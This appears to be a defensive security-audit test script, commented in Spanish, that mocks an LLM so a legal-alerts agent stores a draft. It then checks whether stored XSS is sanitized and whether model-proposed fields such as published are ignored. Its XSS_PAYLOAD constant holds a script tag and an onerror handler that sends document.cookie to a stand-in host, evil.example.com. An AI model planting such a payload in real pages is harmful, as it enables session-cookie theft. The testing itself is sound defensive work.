// Probe #19 de la auditoría de seguridad: prueba DINÁMICA (no solo estática) de la falta de
// sanitización en LegalAlertsAgent — confirmada por lectura de código en audit-security.mjs [18].
// Levanta su PROPIA instancia del servidor en :5051 (no toca :5050/Replit), parcheando
// openai.chat.completions.create ANTES de importar server/index.ts — cero costo de créditos,
// cero contenido real publicado. Sigue el mismo patrón que scripts/test-agents-mocked.ts.
//
// Uso: npx tsx scripts/audit-security-mocked-legal-alerts.ts
import "dotenv/config";
import { adminSessionHeaders, requireIsolatedSecurityTarget } from "./lib/admin-session.mjs";
process.env.PORT = "5051";
const B = "http://localhost:5051";
requireIsolatedSecurityTarget(B);
const sessionHeaders = adminSessionHeaders();

const { neon } = await import("@neondatabase/serverless");
const sql = neon(process.env.DATABASE_URL!);

let pass = 0, fail = 0;
const issues: string[] = [];
function ok(m: string) { pass++; console.log("  ✅ " + m); }
function bad(m: string) { fail++; issues.push(m); console.log("  ❌ " + m); }

// --- 1) Parchar el cliente openai ANTES de levantar el server ---------------
const { openai } = await import("../server/openai");
const XSS_PAYLOAD = '<p>Texto legítimo de la alerta.</p><script>alert(document.cookie)</script><img src=x onerror="fetch(\'https://evil.example.com/steal?c=\'+document.cookie)">';
const MOCK_DRAFT = {
  titleEs: "Alerta de prueba (auditoría de seguridad)",
  title: "Test alert (security audit)",
  excerptEs: "Excerpt de prueba",
  excerpt: "Test excerpt",
  contentEs: XSS_PAYLOAD,
  content: XSS_PAYLOAD,
  slug: "audit-mocked-legal-alert",
  // Campos que NO debería usar el agente aunque el LLM los "proponga" — el código de
  // LegalAlertsAgent.ts hardcodea published:false y category:'alerts', así que esto no debería
  // tener ningún efecto; se incluye para confirmarlo empíricamente, no solo por lectura de código.
  published: true,
  category: "news",
};
(openai.chat.completions as any).create = async () => ({ choices: [{ message: { content: JSON.stringify(MOCK_DRAFT) } }] });

// --- 2) Levantar el servidor real (DB real, rutas reales) en :5051 ----------
await import("../server/index");

async function waitReady() {
  for (let i = 0; i < 40; i++) {
    try { const r = await fetch(B + "/api/agents/status"); if (r.status) return; } catch { /* aún arrancando */ }
    await new Promise((r) => setTimeout(r, 500));
  }
  throw new Error("El servidor de prueba en :5051 nunca respondió");
}

(async () => {
  console.log(`\n=== PROBE #19 — LegalAlertsAgent: XSS almacenado (mockeado, sin costo) — ${B} ===`);
  await waitReady();

  let newsId: string | null = null;
  try {
    const r = await fetch(B + "/api/agents/run/legal_alerts", {
      method: "POST",
      headers: { "content-type": "application/json", ...sessionHeaders },
      body: JSON.stringify({ sourceText: "Texto de fuente oficial simulada para la auditoría de seguridad, con al menos cuarenta caracteres de longitud." }),
    });
    const j: any = await r.json().catch(() => ({}));
    if (r.status !== 200 || !j?.success || !j?.data?.newsId) {
      bad(`el agente no devolvió éxito (${r.status}) ${JSON.stringify(j).slice(0, 200)}`);
    } else {
      newsId = j.data.newsId;
      const [row] = await sql`select content, content_es, published, category from news where id = ${newsId}`;
      if (!row) {
        bad("no se encontró la fila de noticia creada por el agente");
      } else {
        const hasScript = /<script[^>]*>/i.test(row.content || "") || /<script[^>]*>/i.test(row.content_es || "");
        const hasOnerror = /onerror\s*=/i.test(row.content || "") || /onerror\s*=/i.test(row.content_es || "");
        if (hasScript || hasOnerror) bad(`CONFIRMADO: el <script>/onerror del LLM llegó SIN sanitizar a news.content(_es) (id=${newsId}) — LegalAlertsAgent no llama sanitizeFields() antes de storage.createNews`);
        else ok("el contenido llegó sanitizado a la BD (¿se agregó sanitizeFields() recientemente?)");

        if (row.published === false) ok("published quedó en false pese a que el mock 'proponía' true — hardcodeado en el agente, no explotable");
        else bad(`published quedó en ${row.published} — el agente SÍ tomó el valor propuesto por el LLM (posible auto-publicación)`);

        if (row.category === "alerts") ok("category quedó en 'alerts' pese a que el mock proponía 'news' — hardcodeado, no explotable");
        else bad(`category quedó en '${row.category}' — el agente tomó la categoría propuesta por el LLM`);
      }
    }
  } finally {
    if (newsId) await sql`delete from news where id = ${newsId}`.catch(() => {});
  }

  console.log(`\n──── RESULTADO PROBE #19 ────`);
  console.log(`  ✅ PASA: ${pass}   ❌ FALLA: ${fail}`);
  if (issues.length) { console.log("\n  Hallazgos:"); issues.forEach((i) => console.log("   • " + i)); }
  process.exit(fail === 0 ? 0 : 1);
})();
